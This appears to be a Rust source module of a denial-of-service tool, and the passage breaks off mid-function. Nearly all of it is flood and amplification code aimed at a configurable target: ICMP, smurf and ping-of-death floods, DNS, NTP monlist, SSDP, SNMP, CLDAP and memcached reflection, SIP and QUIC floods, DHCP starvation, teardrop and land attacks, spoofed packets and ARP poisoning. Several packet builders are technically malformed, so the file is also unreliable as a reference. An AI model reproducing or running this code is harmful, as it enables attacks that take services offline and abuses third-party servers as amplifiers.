use std::net::{UdpSocket, TcpStream, SocketAddr};
use std::time::Duration;
use std::io::{Write, Read};
use rand::Rng;
use rand::seq::SliceRandom;
use std::sync::atomic::Ordering;
use crate::attack::WorkerCtx;

pub struct OtherAttacker { ctx: WorkerCtx }

impl OtherAttacker {
    pub fn from_ctx(ctx: &WorkerCtx) -> Self { Self { ctx: ctx.clone() } }

    fn alive(&self) -> bool { self.ctx.alive() }
    fn ok(&self)            { self.ctx.ok(); }
    fn err(&self)           { self.ctx.err(); }

    fn bind_udp() -> Option<UdpSocket> {
        let s = UdpSocket::bind("0.0.0.0:0").ok()?;
        let _ = s.set_nonblocking(true);
        Some(s)
    }

    fn rand_bytes(n: usize) -> Vec<u8> {
        (0..n).map(|_| rand::thread_rng().gen::<u8>()).collect()
    }

    fn rand_string(n: usize) -> String {
        (0..n).map(|_| (b'a' + rand::thread_rng().gen_range(0..26u8)) as char).collect()
    }

    fn send_udp(&self, addr: &str, payload: &[u8]) {
        if let Some(sock) = Self::bind_udp() {
            match sock.send_to(payload, addr) {
                Ok(n) => { self.ctx.add_bytes(n as u64); self.ok(); }
                Err(_) => { self.err(); }
            }
        }
    }

    pub async fn icmp_flood(&self) {
        while self.ctx.running.load(Ordering::Relaxed) {
            let addr = format!("{}:0", self.ctx.target);
            if let Some(sock) = Self::bind_udp() {
                let mut rng = rand::thread_rng();
                let mut pkt = vec![0x08u8, 0x00, 0x00, 0x00];
                pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
                pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
                pkt.extend(Self::rand_bytes(56));
                match sock.send_to(&pkt, &addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    pub async fn icmp_smurf(&self) {
        let broadcast = format!("255.255.255.255:0");
        while self.ctx.running.load(Ordering::Relaxed) {
            if let Some(sock) = Self::bind_udp() {
                let _ = sock.set_broadcast(true);
                let pkt = Self::rand_bytes(64);
                match sock.send_to(&pkt, &broadcast) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    pub async fn icmp_fraggle(&self) {
        let addr = format!("{}:7", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::rand_bytes(512));
        }
    }

    pub async fn icmp_ping_of_death(&self) {
        let addr = format!("{}:0", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            if let Some(sock) = Self::bind_udp() {
                let pkt = Self::rand_bytes(65500);
                match sock.send_to(&pkt, &addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    

    pub async fn icmpv6_flood(&self) {
        while self.ctx.running.load(Ordering::Relaxed) {
            if let Ok(sock) = UdpSocket::bind("[::]:0") {
                let addr = format!("[{}]:0", self.ctx.target);
                let pkt = Self::rand_bytes(64);
                match sock.send_to(&pkt, &addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    pub async fn icmpv6_neighbor_solicit(&self) {
        while self.ctx.running.load(Ordering::Relaxed) {
            if let Ok(sock) = UdpSocket::bind("[::]:0") {
                let addr = format!("[ff02::1]:0");
                let mut pkt = vec![0x87u8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                pkt.extend(Self::rand_bytes(16));
                match sock.send_to(&pkt, &addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    pub async fn icmpv6_router_advert(&self) {
        while self.ctx.running.load(Ordering::Relaxed) {
            if let Ok(sock) = UdpSocket::bind("[::]:0") {
                let addr = "ff02::1:0";
                let mut pkt = vec![0x86u8, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00];
                pkt.extend(Self::rand_bytes(24));
                match sock.send_to(&pkt, addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    

    pub async fn dns_query_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::build_dns_query("A"));
        }
    }

    pub async fn dns_any_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::build_dns_query("ANY"));
        }
    }

    pub async fn dns_txt_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::build_dns_query("TXT"));
        }
    }

    pub async fn dns_mx_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::build_dns_query("MX"));
        }
    }

    pub async fn dns_amplification(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut pkt = Self::build_dns_query("ANY");
            pkt[2] = 0x01;
            pkt.extend_from_slice(&[0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00]);
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn dns_nxdomain_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let fake_domain = format!(
                "{}.{}.nonexistent",
                Self::rand_string(12),
                Self::rand_string(8)
            );
            let pkt = Self::build_dns_query_for(&fake_domain, 0x0001);
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn dns_subdomain_flood(&self) {
        let addr = format!("{}:53", self.ctx.target);
        let base = self.ctx.target.clone();
        while self.ctx.running.load(Ordering::Relaxed) {
            let sub = format!("{}.{}", Self::rand_string(10), base);
            let pkt = Self::build_dns_query_for(&sub, 0x0001);
            self.send_udp(&addr, &pkt);
        }
    }

    fn build_dns_query(qtype: &str) -> Vec<u8> {
        let domain = format!("{}.{}.com", Self::rand_string(8), Self::rand_string(5));
        let qt = match qtype {
            "MX" => 0x000Fu16,
            "TXT" => 0x0010,
            "ANY" => 0x00FF,
            "AAAA" => 0x001C,
            _ => 0x0001,
        };
        Self::build_dns_query_for(&domain, qt)
    }

    fn build_dns_query_for(domain: &str, qtype: u16) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut pkt = vec![];
        pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
        pkt.extend_from_slice(&[0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
        for label in domain.split('.') {
            pkt.push(label.len() as u8);
            pkt.extend_from_slice(label.as_bytes());
        }
        pkt.push(0x00);
        pkt.extend_from_slice(&qtype.to_be_bytes());
        pkt.extend_from_slice(&[0x00, 0x01]);
        pkt
    }

    

    pub async fn ntp_reflection(&self) {
        let addr = format!("{}:123", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &[0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00]);
        }
    }

    pub async fn ntp_monlist(&self) {
        let addr = format!("{}:123", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req: Vec<u8> = vec![
                0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            ];
            self.send_udp(&addr, &req);
        }
    }

    pub async fn ntp_time_flood(&self) {
        let addr = format!("{}:123", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut pkt = vec![0xDBu8, 0x00, 0x01, 0x00];
            pkt.extend(Self::rand_bytes(44));
            self.send_udp(&addr, &pkt);
        }
    }

    

    pub async fn gre_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(1));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut pkt = vec![0x00, 0x00, 0x08, 0x00];
            pkt.extend(Self::rand_bytes(1472));
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn gre_keepalive_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(1));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![0x00, 0x01, 0x08, 0x00];
            pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
            pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
            pkt.extend(Self::rand_bytes(64));
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn gre_key_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(1));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![0x20, 0x00, 0x65, 0x58];
            pkt.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
            pkt.extend(Self::rand_bytes(1024));
            self.send_udp(&addr, &pkt);
        }
    }

    

    pub async fn ssdp_reflection(&self) {
        let addr = format!("{}:1900", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: upnp:rootdevice\r\n\r\n";
            self.send_udp(&addr, req);
        }
    }

    pub async fn ssdp_all_devices(&self) {
        let addr = format!("{}:1900", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n";
            self.send_udp(&addr, req);
        }
    }

    pub async fn ssdp_igd_flood(&self) {
        let addr = format!("{}:1900", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n";
            self.send_udp(&addr, req);
        }
    }

    

    pub async fn snmp_reflection(&self) {
        let addr = format!("{}:161", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req: Vec<u8> = vec![
                0x30, 0x26, 0x02, 0x01, 0x01, 0x04, 0x06,
                b'p', b'u', b'b', b'l', b'i', b'c',
                0xa5, 0x19, 0x02, 0x04, 0x71, 0xb4, 0x2b, 0x2c,
                0x02, 0x01, 0x00, 0x02, 0x01, 0x7f, 0x30, 0x0b,
                0x30, 0x09, 0x06, 0x05, 0x2b, 0x06, 0x01, 0x02,
                0x01, 0x05, 0x00,
            ];
            self.send_udp(&addr, &req);
        }
    }

    pub async fn snmp_v3_flood(&self) {
        let addr = format!("{}:161", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut req = vec![0x30, 0x3a, 0x02, 0x01, 0x03];
            req.extend(Self::rand_bytes(53));
            self.send_udp(&addr, &req);
        }
    }

    pub async fn snmp_bulk_walk(&self) {
        let addr = format!("{}:161", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req: Vec<u8> = vec![
                0x30, 0x2b, 0x02, 0x01, 0x01, 0x04, 0x06,
                b'p', b'u', b'b', b'l', b'i', b'c',
                0xa5, 0x1e, 0x02, 0x04, 0x01, 0x00, 0x00, 0x01,
                0x02, 0x01, 0x00, 0x02, 0x01, 0x7f,
                0x30, 0x10, 0x30, 0x0e,
                0x06, 0x0a, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00,
                0x05, 0x00,
            ];
            self.send_udp(&addr, &req);
        }
    }

    

    pub async fn ldap_reflection(&self) {
        let addr = format!("{}:389", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req: Vec<u8> = vec![
                0x30, 0x0c, 0x02, 0x01, 0x01, 0x60, 0x07, 0x02,
                0x01, 0x03, 0x04, 0x00, 0x80, 0x00,
            ];
            self.send_udp(&addr, &req);
        }
    }

    pub async fn cldap_reflection(&self) {
        let addr = format!("{}:389", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req: Vec<u8> = vec![
                0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04,
                0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02,
                0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
                0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74,
                0x43, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00,
            ];
            self.send_udp(&addr, &req);
        }
    }

    pub async fn cldap_netlogon_flood(&self) {
        let addr = format!("{}:389", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut req = vec![
                0x30, 0x2f, 0x02, 0x01, 0x01, 0x63, 0x2a, 0x04,
                0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02,
                0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
                0xa3, 0x15, 0xa3, 0x13, 0x30, 0x11, 0x04, 0x0d,
            ];
            req.extend_from_slice(b"NtVer\x00\x06\x00\x00\x00");
            req.extend_from_slice(&[0x04, 0x00, 0x30, 0x00]);
            self.send_udp(&addr, &req);
        }
    }

    

    pub async fn sip_invite_flood(&self) {
        let addr = format!("{}:5060", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let call_id = Self::rand_string(12);
            let tag = Self::rand_string(8);
            let branch = Self::rand_string(10);
            let req = format!(
                "INVITE sip:{}@{} SIP/2.0\r\n\
                Via: SIP/2.0/UDP {}:5060;branch=z9hG4bK{};rport\r\n\
                Max-Forwards: 70\r\n\
                From: \"Attacker\" <sip:{}@{}>;tag={}\r\n\
                To: <sip:target@{}>\r\n\
                Call-ID: {}@{}\r\n\
                CSeq: 1 INVITE\r\n\
                Contact: <sip:{}@{}:5060>\r\n\
                Content-Type: application/sdp\r\n\
                Content-Length: 0\r\n\r\n",
                Self::rand_string(6), self.ctx.target,
                self.ctx.target, branch,
                Self::rand_string(6), self.ctx.target, tag,
                self.ctx.target,
                call_id, self.ctx.target,
                Self::rand_string(6), self.ctx.target
            );
            self.send_udp(&addr, req.as_bytes());
        }
    }

    pub async fn sip_register_flood(&self) {
        let addr = format!("{}:5060", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = format!(
                "REGISTER sip:{} SIP/2.0\r\n\
                Via: SIP/2.0/UDP {}:5060;branch=z9hG4bK{};rport\r\n\
                Max-Forwards: 70\r\n\
                From: <sip:{}@{}>;tag={}\r\n\
                To: <sip:{}@{}>\r\n\
                Call-ID: {}@{}\r\n\
                CSeq: 1 REGISTER\r\n\
                Contact: *\r\n\
                Expires: 0\r\n\
                Content-Length: 0\r\n\r\n",
                self.ctx.target,
                self.ctx.target, Self::rand_string(10),
                Self::rand_string(6), self.ctx.target, Self::rand_string(6),
                Self::rand_string(6), self.ctx.target,
                Self::rand_string(12), self.ctx.target
            );
            self.send_udp(&addr, req.as_bytes());
        }
    }

    pub async fn sip_options_flood(&self) {
        let addr = format!("{}:5060", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = format!(
                "OPTIONS sip:{} SIP/2.0\r\n\
                Via: SIP/2.0/UDP {}:5060;branch=z9hG4bK{};rport\r\n\
                Max-Forwards: 70\r\n\
                From: <sip:probe@{}>;tag={}\r\n\
                To: <sip:probe@{}>\r\n\
                Call-ID: {}@{}\r\n\
                CSeq: 1 OPTIONS\r\n\
                Content-Length: 0\r\n\r\n",
                self.ctx.target,
                self.ctx.target, Self::rand_string(10),
                self.ctx.target, Self::rand_string(6),
                self.ctx.target,
                Self::rand_string(12), self.ctx.target
            );
            self.send_udp(&addr, req.as_bytes());
        }
    }

    pub async fn sip_cancel_storm(&self) {
        let addr = format!("{}:5060", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = format!(
                "CANCEL sip:{}@{} SIP/2.0\r\n\
                Via: SIP/2.0/UDP {}:5060;branch=z9hG4bK{}\r\n\
                Max-Forwards: 70\r\n\
                From: <sip:{}@{}>;tag={}\r\n\
                To: <sip:{}@{}>\r\n\
                Call-ID: {}@{}\r\n\
                CSeq: 1 CANCEL\r\n\
                Content-Length: 0\r\n\r\n",
                Self::rand_string(6), self.ctx.target,
                self.ctx.target, Self::rand_string(10),
                Self::rand_string(6), self.ctx.target, Self::rand_string(6),
                Self::rand_string(6), self.ctx.target,
                Self::rand_string(12), self.ctx.target
            );
            self.send_udp(&addr, req.as_bytes());
        }
    }

    

    pub async fn rtp_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(5004));
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::build_rtp_packet(0x00));
        }
    }

    pub async fn rtp_dtmf_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(5004));
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::build_rtp_packet(0x65));
        }
    }

    pub async fn rtcp_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(5005));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![0x80u8, 0xC8, 0x00, 0x06];
            pkt.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
            pkt.extend(Self::rand_bytes(24));
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn rtp_jitter_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(5004));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = Self::build_rtp_packet(0x08);
            if pkt.len() > 4 {
                let seq = rng.gen::<u16>().to_be_bytes();
                pkt[2] = seq[0];
                pkt[3] = seq[1];
            }
            self.send_udp(&addr, &pkt);
        }
    }

    fn build_rtp_packet(payload_type: u8) -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut pkt = vec![0x80u8, payload_type];
        pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
        pkt.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
        pkt.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
        pkt.extend(Self::rand_bytes(160));
        pkt
    }

    

    pub async fn quic_initial_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(443));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![0xC0u8];
            pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
            let dcid_len = 8u8;
            pkt.push(dcid_len);
            pkt.extend(Self::rand_bytes(dcid_len as usize));
            pkt.push(0x00);
            pkt.push(0x00);
            pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
            pkt.extend(Self::rand_bytes(1162));
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn quic_version_negotiation(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(443));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut pkt = vec![0x80u8, 0x00, 0x00, 0x00, 0x00];
            pkt.extend(Self::rand_bytes(8));
            pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]);
            pkt.extend_from_slice(&[0xff, 0x00, 0x00, 0x1d]);
            pkt.extend_from_slice(&[0xff, 0x00, 0x00, 0x1e]);
            pkt.extend(Self::rand_bytes(512));
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn quic_path_challenge(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(443));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![0x40u8];
            pkt.extend(Self::rand_bytes(16));
            pkt.push(0x1a);
            pkt.extend_from_slice(&rng.gen::<u64>().to_be_bytes());
            pkt.extend(Self::rand_bytes(1024));
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn quic_stream_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port.max(443));
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![0x40u8];
            pkt.extend(Self::rand_bytes(8));
            pkt.push(0x08);
            pkt.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
            pkt.extend(Self::rand_bytes(1200));
            self.send_udp(&addr, &pkt);
        }
    }

    

    pub async fn dhcp_starvation(&self) {
        let addr = format!("{}:67", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let pkt = Self::build_dhcp_discover();
            if let Some(sock) = Self::bind_udp() {
                let _ = sock.set_broadcast(true);
                match sock.send_to(&pkt, &addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    pub async fn dhcp_release_flood(&self) {
        let addr = format!("{}:67", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let pkt = Self::build_dhcp_release();
            if let Some(sock) = Self::bind_udp() {
                match sock.send_to(&pkt, &addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    pub async fn dhcp_decline_flood(&self) {
        let addr = format!("{}:67", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut pkt = Self::build_dhcp_discover();
            if pkt.len() > 242 {
                pkt[242] = 0x04;
            }
            if let Some(sock) = Self::bind_udp() {
                let _ = sock.set_broadcast(true);
                match sock.send_to(&pkt, &addr) {
                    Ok(_) => { self.ctx.sent.fetch_add(1, Ordering::Relaxed); }
                    Err(_) => { self.ctx.errors.fetch_add(1, Ordering::Relaxed); }
                }
            }
        }
    }

    fn build_dhcp_discover() -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut pkt = vec![0x01u8, 0x01, 0x06, 0x00];
        pkt.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
        pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);
        pkt.extend_from_slice(&[0x00; 4]);
        pkt.extend_from_slice(&[0x00; 4]);
        pkt.extend_from_slice(&[0x00; 4]);
        pkt.extend_from_slice(&[0x00; 4]);
        let mac: [u8; 6] = rng.gen();
        pkt.extend_from_slice(&mac);
        pkt.extend(vec![0x00u8; 202]);
        pkt.extend_from_slice(&[0x63, 0x82, 0x53, 0x63]);
        pkt.extend_from_slice(&[0x35, 0x01, 0x01]);
        pkt.push(0xFF);
        pkt
    }

    fn build_dhcp_release() -> Vec<u8> {
        let mut rng = rand::thread_rng();
        let mut pkt = vec![0x01u8, 0x01, 0x06, 0x00];
        pkt.extend_from_slice(&rng.gen::<u32>().to_be_bytes());
        pkt.extend_from_slice(&[0x00, 0x00]);
        let ip: [u8; 4] = rng.gen();
        pkt.extend_from_slice(&ip);
        pkt.extend_from_slice(&[0x00; 12]);
        let mac: [u8; 6] = rng.gen();
        pkt.extend_from_slice(&mac);
        pkt.extend(vec![0x00u8; 202]);
        pkt.extend_from_slice(&[0x63, 0x82, 0x53, 0x63]);
        pkt.extend_from_slice(&[0x35, 0x01, 0x07]);
        pkt.push(0xFF);
        pkt
    }

    

    pub async fn ip_fragmentation(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::rand_bytes(1480));
        }
    }

    pub async fn ip_land_attack(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![0x45u8, 0x00];
            pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
            pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
            pkt.extend_from_slice(&[0x00, 0x00, 0x40, 0x06, 0x00, 0x00]);
            let target_ip: Vec<u8> = self.ctx.target
                .split('.')
                .filter_map(|o| o.parse::<u8>().ok())
                .collect();
            if target_ip.len() == 4 {
                pkt.extend_from_slice(&target_ip);
                pkt.extend_from_slice(&target_ip);
            }
            pkt.extend(Self::rand_bytes(20));
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn ip_teardrop(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.ctx.running.load(Ordering::Relaxed) {
            let frag1 = Self::rand_bytes(1480);
            let mut frag2 = vec![0x20u8, 0x00];
            frag2.extend(Self::rand_bytes(100));
            self.send_udp(&addr, &frag1);
            self.send_udp(&addr, &frag2);
        }
    }

    pub async fn ip_spoof_flood(&self) {
        let addr = format!("{}:{}", self.ctx.target, self.ctx.port);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let spoof_ip: [u8; 4] = rng.gen();
            let mut pkt = vec![0x45u8, 0x00, 0x00, 0x28];
            pkt.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
            pkt.extend_from_slice(&[0x00, 0x00, 0x40, 0x06, 0x00, 0x00]);
            pkt.extend_from_slice(&spoof_ip);
            pkt.extend(Self::rand_bytes(1024));
            self.send_udp(&addr, &pkt);
        }
    }

    

    pub async fn arp_flood(&self) {
        let addr = format!("{}:0", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut pkt = vec![
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            ];
            let src_mac: [u8; 6] = rng.gen();
            pkt.extend_from_slice(&src_mac);
            pkt.extend_from_slice(&[0x08, 0x06]);
            pkt.extend_from_slice(&[0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01]);
            pkt.extend_from_slice(&src_mac);
            pkt.extend_from_slice(&rng.gen::<[u8; 4]>());
            pkt.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            let target_ip: Vec<u8> = self.ctx.target
                .split('.')
                .filter_map(|o| o.parse::<u8>().ok())
                .collect();
            if target_ip.len() == 4 {
                pkt.extend_from_slice(&target_ip);
            } else {
                pkt.extend_from_slice(&rng.gen::<[u8; 4]>());
            }
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn arp_poison(&self) {
        let addr = format!("{}:0", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let fake_mac: [u8; 6] = rng.gen();
            let mut pkt = vec![];
            let victim_mac: [u8; 6] = rng.gen();
            pkt.extend_from_slice(&victim_mac);
            pkt.extend_from_slice(&fake_mac);
            pkt.extend_from_slice(&[0x08, 0x06]);
            pkt.extend_from_slice(&[0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02]);
            pkt.extend_from_slice(&fake_mac);
            pkt.extend_from_slice(&rng.gen::<[u8; 4]>());
            pkt.extend_from_slice(&victim_mac);
            let target_ip: Vec<u8> = self.ctx.target
                .split('.')
                .filter_map(|o| o.parse::<u8>().ok())
                .collect();
            if target_ip.len() == 4 {
                pkt.extend_from_slice(&target_ip);
            }
            self.send_udp(&addr, &pkt);
        }
    }

    pub async fn arp_gratuitous_flood(&self) {
        let addr = format!("{}:0", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mac: [u8; 6] = rng.gen();
            let fake_ip: [u8; 4] = rng.gen();
            let mut pkt = vec![
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            ];
            pkt.extend_from_slice(&mac);
            pkt.extend_from_slice(&[0x08, 0x06]);
            pkt.extend_from_slice(&[0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x02]);
            pkt.extend_from_slice(&mac);
            pkt.extend_from_slice(&fake_ip);
            pkt.extend_from_slice(&[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
            pkt.extend_from_slice(&fake_ip);
            self.send_udp(&addr, &pkt);
        }
    }

    

    pub async fn memcached_amplification(&self) {
        let addr = format!("{}:11211", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n");
        }
    }

    pub async fn chargen_amplification(&self) {
        let addr = format!("{}:19", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            self.send_udp(&addr, &Self::rand_bytes(1));
        }
    }

    pub async fn tftp_amplification(&self) {
        let addr = format!("{}:69", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let req = b"\x00\x01/etc/passwd\x00octet\x00";
            self.send_udp(&addr, req);
        }
    }

    pub async fn coap_amplification(&self) {
        let addr = format!("{}:5683", self.ctx.target);
        while self.ctx.running.load(Ordering::Relaxed) {
            let mut rng = rand::thread_rng();
            let mut req = vec![0x40u8, 0x01];
            req.extend_from_slice(&rng.gen::<u16>().to_be_bytes());
            req.extend_from_slice(&[0xBB]);
            req.extend_from_slice(b".well-known");
            req.extend_from_slice(&[0x04]);
            req.extend_from_slice(b"core");
